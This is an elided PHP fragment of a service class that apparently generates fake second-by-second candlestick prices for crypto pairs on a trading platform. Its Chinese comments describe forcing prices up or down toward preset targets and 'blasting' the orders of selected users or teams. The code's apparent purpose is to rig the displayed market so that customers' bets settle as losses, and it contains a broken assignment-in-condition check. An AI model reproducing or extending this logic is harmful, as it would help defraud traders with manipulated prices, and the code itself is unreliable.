...
class SysSecondKlineServicebaks extends BaseService
{
...
//            }
            ...
            if ($t == '1m') {
                ...
                if($res_flag){
                    ...
                    if ($res_end == '1') {
                        var_dump('1555555555555555555555555555555555555555');
    ...
    public function create($param)
    {
        ...
        try {
            ...
            for($i = $length; $i >= $append_length; $i--) { // 前N秒 + length-1（预设时间本身）
                ...
                // 加入有序集合
                $this->app(SecondKline::class)->lastmarket($market,$order->id);
                $this->app(SecondKline::class)->addRecordId("{$market}:{$order->id}",$length+1,intval($data['execute_time']));
                $hash_key = "{$market}:{$order->id}:{$data['execute_time']}";
        ...
        try {
            ...
            if ($flag == '1') {  // 让涨
                ...
                if($num_cha && $num_cha['num'] == $index+1 && !$is_explode){
                    ...
                    // $real_price = bcadd(strval($num_cha['init_price']), strval($num_cha['current_cha']), $float_num);//初始值  +  差值 == 最总需要平的值
                    $real_price=$result;
                }else{
                ...
                if ($num_cha && $num_cha['num'] == $index+1 && $result < $real_price) {
    ...
    private function getRand($angle=100, $n2=2, $n=6, $market='', $first='', $current_whole_minute_kline_close_price='', $first_price='', $flag='', $first_length='', $mode='') {
        ...
        if ($market == 'btcusdt' || $market == 'ethusdt' || $market == 'bnbusdt' || $market == 'solusdt') {
            $precise = 2;
        ...
        if ($n != -1) {
                    ...
                    if ($flag == '1') { //控涨
                        if ($current_whole_minute_kline_close_price <= $first_price) {
                            if ($first_price = 0) {
                                ...
                                $arr = $this->randomIncrementToTargetWithZero($current_whole_minute_kline_close_price,$first_price,5,$precise);
                            }

                            $this->logger('[控制K线]','kline')->info(json_encode(['da_pan_cha' => $arr]));
                        } else {//小幅度处理
                            for($i=1;$i<$n;$i++){
                                $arr[]=0;
                            }
                            ...
                            shuffle($arr); // 摇一下
                            $this->logger('[控制K线]','kline')->info(json_encode(['xiao_pan_cha' => $arr]));
                        }
                    } else { //控跌
                        if ($current_whole_minute_kline_close_price >= $first_price) {
                            if ($first_price = 0) {
                                ...
                                $arr = $this->randomDecrementToTargetWithZero($current_whole_minute_kline_close_price,$first_price,5,$precise);
                            }
                            $this->logger('[控制K线]','kline')->info(json_encode(['da_pan_cha' => $arr]));
                        } else {//小幅度处理
                            for($i=1;$i<$n;$i++){
            ...
            if ($market == 'ltcusdt' || $market == 'bnbusdt' || $market == 'solusdt') {
                $temp_arr_base = [0, 0, 0, 1, 0, 0, 1, 0, -1, 0, 1, 0];
            } elseif($market == 'btcusdt') {
                $temp_arr_base = [5, -6, 0, 3, -2, 0, 7, 8, 0, 0, 8, -3];
            } elseif($market == 'ethusdt') {
                $temp_arr_base = [1, -2, 0, 3, -1, 0, -2, 3, 0, 0, 1, -3];
            } else {
    ...
    /*k线操作 - 爆破-个人*/
    public function blasting_user(){

    }

    // k线操作 - 写入-爆破-个人
    public function bsettle_user(){
     ...
     * $userIds 排除用户
     */
    public function bsettle_team($max_count = 4,$max_num = 2000){
        $order_arr = $this->app(UserSecondService::class)->getQuery()->where(['settle_status'=>0, 'is_kong'=>0])
